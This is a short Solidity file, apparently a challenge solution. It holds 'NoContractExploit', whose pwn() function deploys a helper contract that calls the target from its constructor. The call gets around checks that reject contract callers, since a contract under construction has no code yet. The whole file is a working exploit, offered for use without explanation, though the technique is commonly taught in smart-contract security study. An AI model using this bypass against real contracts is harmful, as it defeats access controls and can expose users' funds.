// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Zero {
    constructor(address _target) {
        _target.call("");
    }
}

contract NoContractExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        new Zero(target);
    }
}
